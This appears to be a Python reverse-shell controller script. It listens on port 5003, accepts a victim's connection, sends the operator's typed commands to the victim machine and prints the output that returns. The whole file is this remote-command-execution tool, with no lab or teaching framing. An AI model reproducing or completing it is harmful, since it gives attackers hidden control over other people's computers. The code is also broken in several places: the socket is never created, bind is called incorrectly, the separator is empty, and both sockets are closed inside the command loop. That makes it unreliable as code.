import socket
SERVER_HOST="0.0.0.0"
SERVER_PORT=5003
BUFFER_SIZE=1024*128

SEPARATOR=""
s=socket.socket
s.bind(SERVER_HOST,SERVER_PORT)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.listen(5)
print(f'Listing as {SERVER_HOST}:{SERVER_PORT}....')

clint_socket, clint_address=s.accept()
print(f"{clint_address[0]}:{clint_address[1]} connected!!")

cwd=clint_socket.recv(BUFFER_SIZE).decode()
print(f"[+]Current working directory: {cwd}")

while True:
    command=input(f"{cwd}$>")
    if not command.strip():
        continue
    clint_socket.send(command.encode())
    if command.lower()=="exit":
        break
    outpt=clint_socket.recv(BUFFER_SIZE).decode()
    result, cwd=outpt.split(SEPARATOR)
    print(result)
    clint_socket.close()
    s.close()